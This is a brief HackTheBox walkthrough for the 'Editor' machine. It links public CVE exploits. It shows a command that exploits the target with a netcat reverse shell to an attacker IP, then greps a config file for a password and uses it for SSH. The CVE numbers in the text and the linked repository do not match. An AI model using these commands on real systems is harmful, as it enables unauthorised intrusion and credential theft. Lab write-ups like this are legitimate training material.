# HackTheBox - Editor

**Youtube video:** https://youtu.be/0MxcgOs62YY

---

## Initial Foothold

**Payload:** https://github.com/gunzf0x/CVE-2025-24893

```bash
# Exploit CVE-2024-24893
python CVE-2024-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.16.31 4444 -e /bin/bash'

# Extract password from config
cat hibernate.cfg.xml | grep -i "pass"
```

**SSH Access:**
```bash
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa oliver@$IP
# Password: [found_password]
```

---

## Priv Esc

**Exploit:** https://github.com/AzureADTrent/CVE-2024-32019-POC

```bash
# CVE-2024-32019 exploitation commands
```
